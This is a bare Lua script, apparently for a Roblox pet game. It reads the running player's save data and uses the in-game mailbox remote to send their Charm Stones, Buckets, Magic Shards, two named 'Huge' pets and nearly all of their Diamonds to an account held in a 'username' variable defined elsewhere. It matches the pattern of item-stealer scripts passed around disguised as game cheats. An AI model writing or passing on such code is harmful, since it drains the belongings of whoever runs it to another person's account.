local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
local result = saveModule.Get()

local cs = result.Inventory.Misc
for i, v in pairs(cs) do
    if v.id == "Charm Stone" then
        local args = {
            username,
            "Charm Stone",
            "Misc",
            i,
            v._am or 1
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
    end
end

task.wait(2)

local ms = result.Inventory.Misc
for i, v in pairs(ms) do
    if v.id == "Bucket O' Magic" then
        local args = {
            username,
            "Bucket",
            "Misc",
            i,
            v._am or 1
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
    end
end

task.wait(2)

local cs = result.Inventory.Misc
for i, v in pairs(cs) do
    if v.id == "Bucket" then
        local args = {
            username,
            "Bucket",
            "Misc",
            i,
            v._am or 1
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
    end
end

task.wait(2)

local ms = result.Inventory.Misc
for i, v in pairs(ms) do
    if v.id == "Magic Shard" then
        local args = {
            username,
            "Magic Shard",
            "Misc",
            i,
            v._am or 1
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
    end
end

task.wait(2)

local pet = result.Inventory.Pet
for i, v in pairs(pet) do
    if v.id == "Huge Poseidon Corgi" then
        local args = {
            username,
            "Huge Poseidon Corgi",
            "Pet",
            i,
            v._am or 1
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
    end
end

task.wait(2)

local pet = result.Inventory.Pet
for i, v in pairs(pet) do
    if v.id == "Huge Fossil Dragon" then
        local args = {
            username,
            "Huge Fossil Dragon",
            "Pet",
            i,
            v._am or 1
        }
        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
    end
end

task.wait(2)

local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        local args = {
            [1] = username,
            [2] = v.id,
            [3] = "Currency",
            [4] = i,
            [5] = v._am - 10000
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
    end
end
